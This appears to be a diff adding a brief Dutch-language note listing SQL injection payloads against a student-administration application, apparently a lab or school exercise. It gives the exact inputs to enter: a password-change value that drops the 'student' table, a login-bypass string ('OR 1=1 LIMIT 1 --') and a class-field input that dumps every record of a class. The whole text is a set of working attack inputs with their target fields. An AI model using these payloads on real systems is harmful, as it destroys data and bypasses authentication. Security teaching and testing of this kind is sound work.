@@ -1,0 +1,11 @@
+verwijder studenten: 
+	-	Voer bij nieuw wachtwoord bij wachtwoord wijzigen:
+		1234'; DROP TABLE student;
+	
+by-pass login:
+	-	Voer eerst bij login een studentenummer in en dan bij wachtwoord:
+		' OR 1=1 LIMIT 1 --
+		
+alle gegevens van een klas:
+	- 	Voer in bij klas invullen:
+		INF2D' OR 1=1 --
